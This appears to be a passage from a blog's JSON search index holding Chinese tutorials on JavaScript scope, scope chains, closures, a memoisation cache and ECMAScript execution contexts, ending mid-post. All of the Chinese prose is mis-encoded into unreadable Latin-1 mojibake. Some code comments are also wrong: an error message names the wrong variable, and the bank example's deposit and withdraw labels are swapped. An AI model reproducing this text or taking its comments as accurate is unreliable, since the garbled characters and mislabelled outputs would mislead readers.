åªè¦å…ˆç†è§£ã€Œä½œç”¨åŸŸã€ã€ã€Œä½œç”¨åŸŸéˆã€è·Ÿã€Œå›å‚³å€¼ã€é€™ä¸‰æ¨£æ±è¥¿ï¼Œæˆ‘è¦ºå¾—å°±æ²’é‚£éº¼è¤‡é›œäº†ã€‚ å€åŸŸä½œç”¨åŸŸèˆ‡å…¨åŸŸä½œç”¨åŸŸç°¡å–®ä¾†èªªï¼Œä½œç”¨åŸŸå°±æ˜¯ï¼šä¸€å€‹è®Šæ•¸çš„ç”Ÿå­˜ç¯„åœ åœ¨ JavaScript ä¸­ï¼Œå¿…é ˆé€é function æ‰èƒ½å»ºç«‹å‡ºä½œç”¨åŸŸï¼š 123456function scope() { var a = 10 console.log(a)}scope() // 10console.log(a) // ReferenceError: a is not defined é€™æ™‚å€™æˆ‘å€‘æœƒèªª scope ç”¢ç”Ÿäº†ä¸€å€‹ã€Œå€åŸŸä½œç”¨åŸŸã€ï¼Œè€Œ a æ˜¯é€™å€‹ä½œç”¨åŸŸä¸­çš„ã€Œå€åŸŸè®Šæ•¸ã€ã€‚å®ƒåªæœ‰åœ¨ scope ä¸­å¯ä»¥è¢«å­˜å–ï¼Œå¤–é¢æ²’è¾¦æ³•ã€‚æ‰€ä»¥ a çš„ç”Ÿå­˜ç¯„åœåªåœ¨ scope é€™å€‹ä½œç”¨åŸŸè£¡é¢ã€‚ é‚£å…¨åŸŸä½œç”¨åŸŸå‘¢ï¼Ÿå¾ˆç°¡å–®ï¼Œå°±æ˜¯æ²’æœ‰å®£å‘Šåœ¨ function è£¡çš„è®Šæ•¸ï¼š 123456var a = 10function scope() { console.log(a)}scope() // 10console.log(a) // 10 é€™æ™‚å€™åœ¨å“ªè£¡éƒ½èƒ½å­˜å–åˆ° aï¼Œå› ç‚º a æ˜¯ã€Œå…¨åŸŸè®Šæ•¸ã€ï¼Œä¹Ÿå°±æ˜¯ç”Ÿå­˜ç¯„åœæ˜¯ã€Œå…¨åŸŸä½œç”¨åŸŸã€ã€‚ ä½œç”¨åŸŸéˆï¼ˆScope chainï¼‰åœ¨ç†è§£å€åŸŸä½œç”¨åŸŸè·Ÿå…¨åŸŸä½œç”¨åŸŸå¾Œï¼Œè¦ä¾†ç†è§£ä»€éº¼å«ã€Œä½œç”¨åŸŸéˆã€ï¼Œèˆ‰å€‹ç°¡å–®çš„ä¾‹å­ï¼š 12345678910function scopeA() { var a = 'a' function scopeB() { var b = 'b' console.log(a) // a } scopeB() console.log(b) // ReferenceError: a is not defined}scopeA() åœ¨é€™å€‹ä¾‹å­è£¡é¢ï¼Œæˆ‘å€‘æœ‰å…©å€‹ä½œç”¨åŸŸï¼Œåˆ†åˆ¥æ˜¯ scopeA å’Œ scopeBã€‚ å…ˆçœ‹ b çš„éƒ¨åˆ†ï¼Œä¾ç…§å‰é¢æçš„æ¦‚å¿µï¼Œb çš„ç”Ÿå­˜ç¯„åœåªåœ¨ scopeB ä¸­ï¼Œæ‰€ä»¥åªè¦å‡ºäº† scopeBï¼Œå®ƒå°±æœƒ GGï¼Œæ‰€ä»¥ scopeA å»å­˜å– b çš„æ™‚å€™æ‰æœƒå¾—åˆ°éŒ¯èª¤ã€‚ é‚£ a å‘¢ï¼Ÿ a çš„éƒ¨åˆ†å…¶å¯¦å°±æ˜¯ä½œç”¨åŸŸéˆçš„æ©Ÿåˆ¶ã€‚scopeB åœ¨è‡ªå·±çš„ä½œç”¨åŸŸä¸­æ‰¾ä¸åˆ° aï¼Œæ‰€ä»¥å®ƒå°±å¾€ä¸Šæ‰¾ï¼Œæ‰¾åˆ° scopeA è£¡é¢çš„ aï¼Œæœ€å¾Œå°å‡º a çš„å€¼ã€‚ é€™å€‹ã€Œå¾€ä¸Šæ‰¾ã€çš„è¡Œç‚ºå°±å«åšã€Œä½œç”¨åŸŸéˆã€ï¼Œå”¯ä¸€è¦æ³¨æ„çš„ä¸€é»æ˜¯ï¼Œå®ƒåªèƒ½å¾€ä¸Šæ‰¾ï¼Œä¸èƒ½å¾€ä¸‹æ‰¾ã€‚ é—œæ–¼å›å‚³å€¼å…¶å¯¦å¤§éƒ¨åˆ†çš„æ–‡ç« åœ¨å‘Šè¨´ä½ ä½œç”¨åŸŸè·Ÿä½œç”¨åŸŸéˆå¾Œï¼Œå°±æœƒé–‹å§‹è¬›ä»€éº¼æ˜¯é–‰åŒ…äº†ã€‚ä½†æ˜¯åœ¨é‚£ä¹‹å‰ï¼Œæˆ‘è¦ºå¾—é‚„æœ‰ä¸€å€‹å¾ˆé‡è¦çš„æ±è¥¿ä¸èƒ½å¿½æ‰ï¼šå›å‚³å€¼ ä¸€æ¨£ä¾†èˆ‰é»ä¾‹å­ï¼ŒæŒ‰ç…§ä½œç”¨åŸŸçš„æ¦‚å¿µï¼Œä½ æ²’è¾¦æ³•åœ¨å…¨åŸŸç©ºé–“ä¸­å»å­˜å–å€åŸŸè®Šæ•¸ï¼Œä½†å¦‚æœçœŸçš„è¦å­˜å–çš„è©±æ²’æœ‰ä»»ä½•è¾¦æ³•å—ï¼Ÿå…¶å¯¦æ˜¯æœ‰çš„ï¼Œè€Œä¸”ä½ ä¸€å®šä¹Ÿç”¨éï¼Œé‚£å€‹æ–¹æ³•å°±æ˜¯é€éã€Œå›å‚³å€¼ã€ï¼š 123456function scope() { var a = 10 return a}var result = scope()console.log(result) // 10 é€™æ¨£å°±å¯ä»¥æ‹¿åˆ° a çš„å€¼äº†ã€‚è€Œä¸”ä¸åªæ˜¯é€™æ¨£ï¼Œé€™è£¡é‚„å¯ä»¥è©¦è‘—å›å‚³ç‰©ä»¶æˆ–é™£åˆ—çœ‹çœ‹ï¼š 123456function scope() { var a = 10 return [a]}var arr = scope()console.log(arr) // [10] 123456function scope() { var a = 10 return {a: a}}var obj = scope()console.log(obj) // {a: 10} æœ€å¾Œå¦‚æœè®Šæˆå›å‚³ function å‘¢ï¼Ÿ 12345678function scope() { var a = 10 return function () { console.log(a) }}var fn = scope() // æ‹¿åˆ° functionfn() // åŸ·è¡Œ function =&gt; 10 æŠŠ function æ”¾åˆ°æœ€å¾Œæ‰è¬›æ˜¯å› ç‚ºæˆ‘è¦ºå¾—é€™æ¨£æ¯”è¼ƒå¥½ç†è§£ï¼Œå¦‚æœä¸€é–‹å§‹å°±æ‹¿ function ä¾†èˆ‰ä¾‹ä½ å¯èƒ½æœƒæœ‰é»æ··äº‚ï¼Œä¸çŸ¥é“ç‚ºä»€éº¼å¯ä»¥åœ¨ function è£¡é¢å­˜å–åˆ° aã€‚å› æ­¤æ‰ç”¨é€™ç¨®ä¸€æ­¥ä¸€æ­¥ä¾†çš„æ–¹å¼ï¼Œå¸Œæœ›é€™æ¨£æœƒå¥½ç†è§£ä¸€é»ã€‚ æ‰€ä»¥ä½ çŸ¥é“åªè¦åˆ©ç”¨ã€Œå›å‚³ã€ï¼Œä¸ç®¡æœ€å¾Œçš„å›å‚³å€¼æ˜¯è®Šæ•¸å€¼ã€ç‰©ä»¶ã€é™£åˆ—æˆ–å‡½å¼ï¼Œ a çš„å€¼éƒ½æœƒè¢«ä¿ç•™ä¸‹ä¾†ï¼Œåªä¸é function çš„ä¾‹å­æ¯”è¼ƒç‰¹åˆ¥ä¸€é»ï¼Œä½ è¦è€ƒæ…®å‰é¢æåˆ°çš„ã€Œä½œç”¨åŸŸéˆæ©Ÿåˆ¶ã€ã€‚é‚„è¨˜å¾—å—ï¼Ÿé›–ç„¶ function è‡ªå·±çš„ä½œç”¨åŸŸè£¡é¢æ²’æœ‰ a ä½†æ˜¯å®ƒå¯ä»¥å¾€ä¸Šæ‰¾ï¼Œæ‰¾åˆ° scope è£¡é¢çš„ aï¼Œæ‰€ä»¥æœ€å¾Œåœ¨åŸ·è¡Œ fn çš„æ™‚å€™æ‰èƒ½å¤ å­˜å–åˆ° aã€‚ éœæ…‹ä½œç”¨åŸŸèˆ‡å‹•æ…‹ä½œç”¨åŸŸä¸éä½ å¯èƒ½é‚„æœ‰ä¸€å€‹ç–‘å•ï¼šã€Œfn æ˜¯åœ¨å…¨åŸŸç©ºé–“åŸ·è¡Œçš„ï¼Œå¦‚æœç¾åœ¨æœ‰å€‹å…¨åŸŸè®Šæ•¸ä¹Ÿå« a å‘¢ï¼Ÿã€ 123456789var a = 100 // =&gt; æ–°å¢ä¸€å€‹å…¨åŸŸè®Šæ•¸function scope() { var a = 10 return function () { console.log(a) }}var fn = scope() // fn() // 10 or 100 ? é€™å€‹å•é¡Œéå¸¸å¥½ï¼Œé¦–å…ˆæ­£ç¢ºç­”æ¡ˆæ˜¯ 10ã€‚ å…¶å¯¦æ˜¯é€™æ¨£çš„ï¼Œåœ¨ JavaScript ä¸­ä¸€å€‹ function è¢«å®£å‘Šçš„æ™‚å€™ï¼Œå®ƒçš„ä½œç”¨åŸŸå°±å·²ç¶“æ±ºå®šå¥½äº†ï¼ˆç‰¹åˆ¥å¼·èª¿ JavaScript æ˜¯å› ç‚ºæœ‰äº›ç¨‹å¼èªè¨€ä¸æ˜¯é€™æ¨£å­ï¼‰ æ‰€ä»¥æŒ‰ç…§é€™å€‹è¦å‰‡ï¼Œfunction åœ¨è¢«å›å‚³çš„æ™‚å€™ï¼Œå®ƒçš„ä½œç”¨åŸŸæ˜¯é€™æ¨£å­ï¼š 1234567var a = 100function scope() { var a = 10 return function () { console.log(a) }} é€™æ¨£æ‡‰è©²å°±å¥½ç†è§£å¤šäº†å§ï¼Ÿæ‰€ä»¥ä¸è«–ä½ ä¹‹å¾Œåœ¨å“ªè£¡å‘¼å«é€™å€‹ functionï¼Œå®ƒçš„ä½œç”¨åŸŸéƒ½ä¸æœƒè®Šï¼Œé€™ä¸€å®šè¦ææ¸…æ¥šã€‚ é–‰åŒ…çµ‚æ–¼è¦ä¾†è«‡ä»Šå¤©çš„ä¸»é¡Œï¼Œä½†å…¶å¯¦å‰›å‰›ç¤ºç¯„çš„ä¾‹å­è£¡å°±åŒ…å«äº†é–‰åŒ…çš„æ¦‚å¿µï¼š 123456789function scope() { var a = 10 return function () { console.log(a) }}var fn = scope() fn() // 10 console.log(a) // ReferenceError: a is not defined ä¸ç”¨æ‡·ç–‘ï¼Œåƒ a é€™æ¨£è¢«é—œåœ¨ function è£¡é¢ï¼Œåªèƒ½é€é fn ä¾†å­˜å–çš„é€™å€‹è¡Œç‚ºå°±å«ã€Œé–‰åŒ…ã€ã€‚ æˆ‘è¦ºå¾—é€™å€‹æ©Ÿåˆ¶æœ¬èº«æ²’æœ‰ä»€éº¼ï¼Œé‡è¦çš„æ˜¯ä½ è¦ç†è§£é€™æ˜¯æ€éº¼åšåˆ°çš„ï¼Œé™¤äº†å‰é¢æåˆ°çš„ã€Œå›å‚³å€¼ã€å¤–ï¼Œé‚„è¦ç†è§£ã€Œä½œç”¨åŸŸã€ã€ã€Œä½œç”¨åŸŸéˆã€æ‰èƒ½çœŸæ­£ç†è§£åŸå› ã€‚ æ‰€ä»¥æ¥ä¸‹ä¾†åªç¤ºç¯„ä¸€äº›é–‰åŒ…çš„ç¶“å…¸é¡Œç›®ï¼Œé‚„æœ‰å¯¦éš›ç”¨é€”ã€‚ setTimeout å°å‡º i çš„å€¼ä¸€å€‹å¾ˆç¶“å…¸çš„é¡Œç›®ï¼š 12345for(var i=0; i&lt;=5; i++) { setTimeout(function() { console.log(i) })} æœ€å¾Œçš„çµæœæœƒæ˜¯ï¼š 1234566666 å…¶å¯¦åŸå› åªæ˜¯ç•¶ callback function åŸ·è¡Œçš„æ™‚å€™ï¼Œå®ƒè‡ªå·±çš„ä½œç”¨åŸŸè£¡é¢æ²’æœ‰ iï¼Œæ‰€ä»¥ä¾ç…§ä½œç”¨åŸŸéˆå¾€ä¸Šæ‰¾ï¼Œæœ€å¾Œæ‰¾åˆ°å…¨åŸŸç©ºé–“çš„ iï¼Œåªæ˜¯é€™æ™‚å€™è¿´åœˆå·²ç¶“è·‘å®Œäº†ï¼Œæ‰€ä»¥æ‰æœƒæ˜¯ 6ã€‚ æ”¹å¯«çš„æ–¹å¼æœ‰å¾ˆå¤šï¼Œæˆ‘åˆ—å¹¾å€‹æ¯”è¼ƒå¸¸è¦‹çš„ã€‚ 1. åœ¨åŒ…ä¸€å±¤ function 12345678function printNumber(num) { return function () { console.log(num) }}for(let i=0; i&lt;=5; i++) { setTimeout(printNumber(i), 1000)} æˆ–æ”¹å¯«æˆ IIFEï¼š 1234567for(let i=0; i&lt;=5; i++) { setTimeout((function(num){ return function() { console.log(num) } })(i), 1000)} 2. æ”¹ç”¨ ES6 çš„ let let çš„ä½œç”¨åŸŸæ˜¯ç”¨ {} ä¾†ç”¢ç”Ÿçš„ï¼Œæ‰€ä»¥å¯ä»¥å¯«æˆï¼š 12345for(let i=0; i&lt;=5; i++) { setTimeout(function() { console.log(i) })} å¯ä»¥æƒ³æˆæ˜¯é€™æ¨£ï¼š 123456789101112131415{ let i = 0 setTimeout(function() { console.log(i) })}{ let i = 1 setTimeout(function() { console.log(i) })}... å»ºç«‹ç§æœ‰è®Šæ•¸åŠå…¬é–‹æ–¹æ³•é€éé–‰åŒ…çš„ç‰¹æ€§ï¼Œä½ å¯ä»¥æŠŠè®Šæ•¸è—åœ¨ function è£¡é¢ï¼Œè®“å¤–é¢çš„äººæ²’è¾¦æ³•å­˜å–ï¼Œä¸¦ä¸”åªèƒ½é€éå…¬é–‹ï¼ˆreturnï¼‰å‡ºå»çš„æ±è¥¿ä¾†å­˜å–ã€‚ ä¾†ç°¡å–®æ™‚åšä¸€å€‹ã€Œé–‹æˆ¶ã€çš„åŠŸèƒ½ï¼š é–‹æˆ¶æ™‚è¦å…ˆå­˜ 1000 å¡Š é–‹æˆ¶å¾Œå¯ä»¥æŸ¥è©¢é¤˜é¡ã€é ˜éŒ¢ã€å­˜éŒ¢ 12345678910111213141516171819202122232425262728function createBank(money) { if (money &lt; 1000) return 'å­˜å¤ªå°‘å•¦' // è¦å…¬é–‹å‡ºå»çš„æ±è¥¿ let bank = { searchMoney() { console.log('ç›®å‰é¤˜é¡ï¼š', money) }, getMoney(value) { money -= value console.log('å­˜å…¥é‡‘é¡ï¼š', value) console.log('ç›®å‰é¤˜é¡ï¼š', money) }, setMoney(value) { money += value console.log('é ˜å–é‡‘é¡ï¼š', value) console.log('ç›®å‰é¤˜é¡ï¼š', money) } } console.log('é–‹æˆ¶æˆåŠŸ') return bank}const error = createBank(900) console.log(error) // å­˜å¤ªå°‘å•¦const PeaNu_BANK = createBank(1000) // é–‹æˆ¶æˆåŠŸPeaNu_BANK.searchMoney() // ç›®å‰é¤˜é¡ï¼š1000 PeaNu_BANK.setMoney(500) // å­˜å…¥é‡‘é¡ï¼š500ï¼Œç›®å‰é¤˜é¡ï¼š1500PeaNu_BANK.getMoney(1000) // é ˜å–é‡‘é¡ï¼š1000ï¼Œç›®å‰é¤˜é¡ï¼š500console.log(money) // ReferenceError: a is not defined é€™é‚Šç°¡å–®ç¤ºç¯„æ‰€ä»¥å°±æ²’åšå¤ªå¤šçš„é¡å¤–è™•ç†äº†ï¼Œæ–¹ä¾¿çœ‹æ‡‚æœ€é‡è¦ã€‚ æ‰€ä»¥ä»¥ä¸Šé€™æ˜¯é—œæ–¼é–‰åŒ…ï¼Œé‚„æœ‰é–‰åŒ…çš„ç”¨è™•ã€‚","link":"/2022/01/14/closure-again/"},{"title":"é–‰åŒ…çš„æ‡‰ç”¨ï¼cache æ©Ÿåˆ¶","text":"æ¯”è¼ƒå°‘è¦‹çš„ä¾‹å­ã€‚ ç°¡è¿°å¤§éƒ¨åˆ†çš„é–‰åŒ…éƒ½æ˜¯ä»¥ã€Œç§æœ‰ / å…¬é–‹æ–¹æ³•ã€ä¾†èˆ‰ä¾‹ã€‚cache çš„ä¾‹å­æˆ‘è¦ºå¾—é‚„è »å°‘è¦‹çš„ï¼Œæ‰€ä»¥ç‰¹åˆ¥è¨˜ä¸€ä¸‹ã€‚ 1234567891011121314151617181920function complex (num) { console.log('Calculating'); return num * num * num;}function cache (fn) { const ans = {}; return function (num) { // å¦‚æœ ans è£¡é¢æ‰¾çš„åˆ°å°±ç›´æ¥å›å‚³ if (ans[num]) { return ans[num]; } // æ‰¾ä¸åˆ°å°±åŸ·è¡Œå‚³é€²ä¾†çš„ fn æ±‚å‡ºçµæœ return ans[num] = fn(num); }}const cacheComplex = cache(complex);console.log(cacheComplex(20)); // åªæœ‰ç¬¬ä¸€æ¬¡æœƒå‡ºç¾ Calculatingconsole.log(cacheComplex(20));console.log(cacheComplex(20)); ç¸½ä¹‹å‘¢ï¼Œæ¯æ¬¡åŸ·è¡Œ cacheComplex å…¶å¯¦å°±æ˜¯åŸ·è¡Œåœ¨ cache è£¡çš„é‚£å€‹åŒ¿åå‡½å¼ï¼Œå®ƒæœƒæœ‰å…©æ¢è·¯ï¼š å¦‚æœé–‰åŒ…è£¡çš„ ans[num] æœ‰å€¼å°±ç›´æ¥å›å‚³ å¦‚æœæ²’æœ‰ï¼Œå°±åŸ·è¡Œé–‰åŒ…è£¡çš„ fnï¼Œé€²è¡Œè¤‡é›œè¨ˆç®— é‡é»åœ¨æ–¼ä¸ç®¡ call å¹¾æ¬¡ cacheComplex å®ƒå€‘éƒ½èƒ½å…±ç”¨åŒä¸€å€‹ ans å’Œ fn çš„è³‡è¨Šã€‚","link":"/2022/03/06/closure-example-cache/"},{"title":"å¾ ECMAScript ä¾†ç†è§£é–‰åŒ…èˆ‡ä½œç”¨åŸŸçš„åŸç†","text":"é€™ä¸€æ¬¡çœŸçš„æ‡‚äº†ã€‚ ç°¡è¿°è®€é€™ç¯‡æ–‡ç« å‰ï¼Œè«‹å…ˆç†è§£ä»€éº¼æ˜¯ EC èˆ‡ VOï¼Œä¸ç„¶ä½ çµ•å°çœ‹ä¸æ‡‚ï¼Œå¯ä»¥åƒè€ƒé€™ç¯‡ï¼šå­¸ hoisting ä¹‹å‰å…ˆç†è§£ EC æ˜¯ä»€éº¼ï¼Ÿ Scope chain åˆ°åº•æ˜¯æ€éº¼ç”¢ç”Ÿçš„ï¼Ÿç¯€éŒ„å¹¾å€‹ ECMAScript è£¡æåˆ°çš„é‡é»ï¼š æ¯ä¸€å€‹ EC éƒ½æœ‰ä¸€å€‹ scope chainï¼Œè€Œ scope chain æ˜¯ä¸€å€‹ç”¨é™£åˆ—åŒ…ä½çš„å„ç¨®ç‰©ä»¶ã€‚ä¾‹å¦‚èªªï¼š[scopeA, scopeB, scopeC, ...] Every execution context has associated with it a scope chain. A scope chain is a list of objects that are searched when evaluating an Identifier. é€²å…¥ä¸€å€‹ EC æ™‚ï¼Œå°±æœƒå»ºç«‹ä¸€å€‹ scope chain When control enters an execution context, a scope chain is created and populated with an initial set of objects, Function çš„ scope chain åˆå§‹å€¼æ˜¯ç”± AOï¼ˆActivation Objectï¼‰å’Œ [[Scope]] çµ„æˆçš„ The scope chain is initialised to contain the activation object followed by the objects in the scope chain stored in the [[Scope]] property of the Function object. æ‰€ä»¥ç¸½çµä¸€ä¸‹ï¼Œç•¶é€²å…¥ä¸€å€‹ function æ™‚ï¼Œæœƒç”¢ç”Ÿä¸€å€‹ ECï¼ŒEC è£¡é¢æœƒæœ‰ scope chain ï¼Œè€Œ scope chain çš„å€¼æ˜¯è‡ªå·±çš„ AO/VO åŠ ä¸Š [[Scope]] ä¾†çµ„æˆï¼Œæ‰€ä»¥å¤§æ¦‚æœƒé•·çš„åƒé€™æ¨£ï¼š 1234FuncEC: { AO: {...}, scope chain : [AO, [[Scope]]]} è‡³æ–¼ AO æ˜¯ä»€éº¼ï¼Ÿ AO å…¶å¯¦å°±è·Ÿ å­¸ hoisting ä¹‹å‰å…ˆç†è§£ EC æ˜¯ä»€éº¼ï¼Ÿ è£¡é¢æåˆ°çš„ VO æ˜¯ 87 åˆ†åƒçš„æ±è¥¿ï¼Œå·®åˆ¥åœ¨æ–¼ AO åªæœƒåœ¨ function çš„ EC ç”¢ç”Ÿï¼Œ VO åªæœƒåœ¨ Global EC ç”¢ç”Ÿã€‚ ä¸éèªªå¯¦åœ¨å®ƒå€‘çš„å·®ç•°å¾ˆå¾®å°ï¼Œæ‰€ä»¥å‘¢ï¼ŒæŠŠ AO æƒ³æˆæ˜¯ VO å°±å¥½äº†ã€‚ æ¥ä¸‹ä¾†ç”¨ä¸€æ®µç¨‹å¼ç¢¼ç¤ºç¯„ä¸€ä¸‹ï¼Œç‚ºäº†æ–¹ä¾¿ç†è§£ï¼Œè«‹å…ˆè¨˜ä½ä¸‹é¢çš„éŠæˆ²è¦å‰‡ï¼š [[Scope]] = ä¸Šä¸€å€‹ EC è£¡çš„ scope chainï¼ˆé€™å€‹æ¯”è¼ƒé›£è§£é‡‹ï¼Œå»ºè­°æ­é…ä¸‹é¢çš„ä¾‹å­å¤šæƒ³å¹¾éï¼‰ scope chain = è‡ªå·± EC è£¡çš„ AO/VO åŠ ä¸Š [[Scope]] 1234567891011var a = 1function yoyoyo() { var b = 2 function hahaha() { var c = 3 console.log(b) console.log(a) } hahaha()}yoyoyo() 1234567891011121314151617181920212223242526272829303132333435363738394041// 3. å»ºç«‹ hahaha çš„ EChahahaEC: { AO: { c: undefined, } // è‡ªå·±çš„ AO/VO å†åŠ ä¸Š [[Scope]] scope chain: = [hahahaEC.AO, hahaha.[[Scope]]] = [hahahaEC.AO, yoyoyoEC.AO, globalEC.VO]};// 2. å»ºç«‹ yoyoyo çš„ ECyoyoyoEC: { AO: { b: 2, hahaha: function }; // è‡ªå·±çš„ AO/VO å†åŠ ä¸Š [[Scope]] scope chain: = [yoyoyoEC.AO, yoyoyo.[[Scope]]] = [yoyoyoEC.AO, globalEC.VO]};// åˆå§‹åŒ– hahaha çš„ [[Scope]]// ä¹Ÿå°±æ˜¯ yoyoyo çš„ scope chainï¼ˆä¸Šä¸€å€‹ EC è£¡çš„ scope chainï¼‰hahaha.[[Scope]] = [yoyoyoEC.AO, globalEC.VO]// 1. å»ºç«‹ globalECglobalEC: { VO: { a: 1, yoyoyo: function }; // scope chain = è‡ªå·±çš„ AO/VO å†åŠ ä¸Š [[Scope]]ï¼Œ // ä½† global ä¸æ˜¯ function æ‰€ä»¥æ²’æœ‰ [[Scope]] scope chain = [globalEC.VO];};// åŒæ™‚æœƒå»ºç«‹ yoyoyo çš„éš±è—å±¬æ€§ [[Scope]]// åˆå§‹å€¼å°±æ˜¯ globalEC è£¡çš„ scope chainï¼ˆä¸Šä¸€å€‹ EC è£¡çš„ scope chainï¼‰yoyoyo.[[Scope]] = [globalEC.VO] æ‰€ä»¥ scope chain å°±æ˜¯é€éä¸Šé¢çš„æ–¹å¼ä¾†å»ºç«‹çš„ã€‚ ç†è§£é–‰åŒ…çš„æœ€å¾Œä¸€å¡Šæ‹¼åœ–ï¼šå‡è£è‡ªå·±æ˜¯ JS å¼•æ“é€™å€‹æ­¥é©Ÿé›–ç„¶æ¯”è¼ƒç¹ç‘£ï¼Œä½†ä½ åªè¦èµ°éä¸€éï¼Œå°±èƒ½ç†è§£é–‰åŒ…çš„åŸç†äº†ã€‚ é€™é‚Šçš„ä¾‹å­å¦‚ä¸‹ï¼š 12345678910var v1 = 10function test() { var vTest = 20 function inner() { console.log(vTest, v1) } return inner}var inner = test()inner() æ¥ä¸‹ä¾†å°±ä¾†ä¸€è¡Œä¸€è¡ŒåŸ·è¡Œã€‚ é¦–å…ˆï¼Œå…ˆé€²å…¥ globalECï¼š 12345678910globalEC: { VO: { v1: undefined, inner: undefined, test: function } scope chain: [globalEC.VO]};// åˆå§‹åŒ– test çš„ [[Scope]]test.[[Scope]] = [globalEC.VO] Line1 var v1 = 10 12345678globalEC: { VO: { v1: 10, // æ›´æ–° VO è£¡çš„å€¼ inner: undefined, test: function } scope chain: [globalEC.VO]} Line9 var inner = test() æ¥ä¸‹ä¾†æœƒé€²å…¥ test çš„ ECï¼š 123456789testEC: { AO: { vTest: undefined, inner: function } scope chain: [testEC.AO, globalEC.VO]};// åˆå§‹åŒ– inner çš„ [[Scope]]inner.[[Scope]] = [testEC.AO, globalEC.VO] Line3 var vTest = 20 1234567testEC: { AO: { vTest: 20, // æ›´æ–° AO è£¡çš„å€¼ inner: function } scope chain: [testEC.AO, globalEC.VO]} Line7 return inner åŸ·è¡Œåˆ°é€™ä¸€è¡Œæ™‚ï¼Œç…§ç†èªª testEC å°±æœƒè¢« JS çš„ GCï¼ˆGarbage Collection åƒåœ¾å›æ”¶ï¼‰æ©Ÿåˆ¶çµ¦å›æ”¶æ‰ã€‚ ä½†æ˜¯ï¼Œæ³¨æ„é€™é‚Šæ˜¯å›å‚³ï¼Œæ‰€ä»¥ inner.[[Scope]] æœƒè¢«ç•™ä¸‹ä¾†ï¼Œç•™ä¸‹çš„å…§å®¹å°±æ˜¯ [testEC.AO, globalEC.VO]ï¼Œå› æ­¤åœ¨ inner é€™å€‹ function è£¡å°±èƒ½å­˜å–åˆ° test è·Ÿ global çš„ AO/VOã€‚ æ‰€ä»¥é€™æ®µå°±æ˜¯é–‰åŒ…çš„åŸç†ï¼Œå› ç‚º return çš„é—œä¿‚ï¼Œè®“åŸæœ¬æ‡‰è©²è¦è¢«æ¸…æ‰çš„è³‡æºæ²’æœ‰è¢«æ¸…æ‰ã€‚é€™ä¹Ÿè§£é‡‹äº†ç‚ºä»€éº¼ inner æ˜æ˜é›¢é–‹äº†åŸæœ¬çš„ EC å»é‚„æœ‰è¾¦æ³•å­˜å–åˆ° test å’Œ global çš„ AO/VOã€‚é€™ä¸€æ®µæ¯”è¼ƒè¤‡é›œä¸€é»ï¼Œä½ å¯ä»¥å¤šæƒ³å¹¾æ¬¡çœ‹çœ‹ã€‚ ç¸½ä¹‹å‘¢ï¼Œåœ¨å›å‚³å¾Œçš„ç‹€æ…‹æœƒè®Šæˆé€™æ¨£ï¼š 123456789101112131415// æ­¤æ™‚ testEC å·²ç¶“æ¸…æ‰äº†ã€‚// ä½†å› ç‚º inner.[[Scope]] çš„é—œä¿‚ testEC.AO æœƒç•™ä¸‹testEC.AO { vTest: 20, inner: function};globalEC: { VO: { v1: 10, inner: undefined, test: function } scope chain: [globalEC.VO]}inner.[[Scope]] = [testEC.AO, globalEC.VO] Line10 inner() é€²å…¥ inner çš„ ECï¼š 123456innerEC: { AO: { // ç©ºçš„ } scope chain: [innerEC.AO, testEC.AO, globalEC.VO]} Line5 console.log(vTest, v1) é€™é‚Šåˆ†å…©æ®µï¼Œå…ˆæ‰¾ vTest çš„å€¼ï¼š åˆ° innerEC.AO æ‰¾ï¼Œæ²’æœ‰æ‰¾åˆ°ã€‚ åˆ° testEC.AO æ‰¾ï¼Œæ‰¾åˆ°äº†ï¼Œæ˜¯ vTest: 20ï¼ŒæˆåŠŸå°å‡º 20ã€‚ æ¥è‘—æ‰¾ v1 çš„å€¼ï¼š åˆ° innerEC.AO æ‰¾ï¼Œæ²’æœ‰æ‰¾åˆ°ã€‚ åˆ° testEC.AO æ‰¾ï¼Œæ²’æœ‰æ‰¾åˆ°ã€‚ åˆ° globalEC.Vo æ‰¾ï¼Œæ‰¾åˆ°äº†ï¼Œæ˜¯ v1: 10ï¼ŒæˆåŠŸå°å‡º 10ã€‚ ä»¥ä¸Šã€‚","link":"/2022/03/06/closure-principle/"},{"title":"è«‡è«‡ JS ä¸­çš„ Closureï¼ˆé–‰åŒ…ï¼‰","text":"å¥½åƒå¾ˆä¹…æ²’æœ‰ä¸Šä¾†å¯«æ–‡ç« äº†ã€‚å‰ä¸€é™£å­èŠ±äº†æ¯”è¼ƒå¤šçš„æ™‚é–“åœ¨å¿™è‘—åšåœ‹å¤–ç¶²ç«™çš„æŒ‘æˆ°ï¼Œä¹ŸåƒåŠ äº†ä¸€å ´ç«¶è³½æ´»å‹•ï¼Œæ‰€ä»¥éƒ¨è½æ ¼æš«æ™‚åœæ“ºäº†å¹¾å€‹æœˆã€‚ æœ€è¿‘æœ‰äº†æ–°çš„è¦åŠƒï¼Œä¸»è¦æ˜¯æƒ³æå‡é—œæ–¼ JS çš„ç›¸é—œçŸ¥è­˜ï¼Œä¹Ÿæƒ³è¦æŠŠä»¥å‰ç•™ä¸‹çš„å‘çµ¦å¡«å®Œã€‚æˆ‘ç™¼ç¾æˆ‘ä»¥å‰çš„æ–‡ç« å¤šæ•¸æ˜¯ä»¥ CSS ç‚ºä¸»ï¼Œä½†å‰ç«¯é™¤äº† HTMLã€CSS ä¹‹å¤–ï¼ŒJavaScript ä¹Ÿæ˜¯å¾ˆé‡è¦çš„æ ¸å¿ƒã€‚æ‰€ä»¥â€¦æ˜¯æ™‚å€™ä¾†å¯«å¯«é—œæ–¼ JS çš„æ–‡ç« äº†ï¼ˆè©±èªªæˆ‘å¥½åƒé‚„æ²’æœ‰åœ¨é€™è£¡ç™¼é JS çš„æ–‡ç« ï¼‰ã€‚ å»¢è©±ä¸å¤šèªªï¼Œé¦¬ä¸Šé–‹å§‹å§ï¼ä½œç‚º JS çš„ç¬¬ä¸€ç¯‡æ–‡ç« ï¼Œæƒ³è·Ÿå¤§å®¶è«‡çš„æ˜¯ã€Œé–‰åŒ…ï¼ˆClosureï¼‰ã€ã€‚ ä½œç”¨åŸŸï¼ˆScopeï¼‰åœ¨äº†è§£é–‰åŒ…ä¹‹å‰ï¼Œè¦å…ˆçŸ¥é“ä½œç”¨åŸŸæ˜¯ä»€éº¼æ±è¥¿ï¼Ÿ ä½œç”¨åŸŸæŒ‡çš„æ˜¯ï¼šä¸€å€‹è®Šæ•¸çš„ç”Ÿå­˜ç¯„åœã€‚ æˆ‘å€‘ç›´æ¥çœ‹ä¸€å€‹ä¾‹å­ï¼š 1234function test() { var a = 10}console.log(a) // Uncaught ReferenceError: a is not defined 